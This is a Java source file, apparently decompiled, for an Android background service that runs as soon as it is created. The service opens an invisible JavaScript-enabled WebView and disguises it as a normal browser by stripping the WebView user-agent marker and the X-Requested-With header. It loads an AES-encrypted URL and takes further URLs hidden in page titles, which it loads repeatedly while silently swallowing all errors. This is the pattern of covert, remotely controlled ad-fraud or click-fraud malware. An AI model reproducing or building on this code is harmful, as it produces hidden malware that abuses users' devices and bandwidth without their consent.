package com.fsoc131y.wirex.service;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import com.fsoc131y.wirex.BuildConfig;
import com.fsoc131y.wirex.R;
import com.fsoc131y.wirex.util.SharedPref;
import java.util.HashMap;
import java.util.Map;

public class LoadUrlService extends Service {
  WebView webView;
  String url;
  String tempUserAgent;
  String userAgent;
  int e;
  int f;
  Map<String, String> g;

  public LoadUrlService() {
    e = 1;
    f = 1;
  }

  @SuppressLint({ "SetJavaScriptEnabled" }) public void eindoejyrun() {
    try {
      webView = new WebView(this);
      webView.getSettings().setJavaScriptEnabled(true);
      webView.getSettings().setSupportMultipleWindows(true);
      webView.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
      tempUserAgent = webView.getSettings().getUserAgentString();
      userAgent = tempUserAgent.replace("; wv", BuildConfig.FLAVOR);
      webView.getSettings().setUserAgentString(userAgent);
      g = new HashMap();
      g.put("X-Requested-With", BuildConfig.FLAVOR);
      webView.loadUrl(SharedPref.AES(getString(R.string.key), getString(R.string.app_url)));
      webView.setWebViewClient(new WebViewClient() {
        public void onPageFinished(WebView webView, String str) {
          try {
            if (e == 1) {
              if (webView.getTitle() != null && webView.getTitle().contains("eindoejy")) {
                String[] split = webView.getTitle().trim().split("eindoejy");
                webView.loadUrl(split[0]);
                url = split[1];
                e++;
              }
            } else if (f <= 3) {
              webView.loadUrl(url);
              f++;
            }
          } catch (Exception e) {
          }
        }
      });
    } catch (Exception e) {
    }
  }

  public IBinder onBind(Intent intent) {
    return null;
  }

  public void onCreate() {
    super.onCreate();
    eindoejyrun();
  }

  public void onDestroy() {
    try {
      webView.destroy();
    } catch (Exception e) {
    }
    super.onDestroy();
  }
}
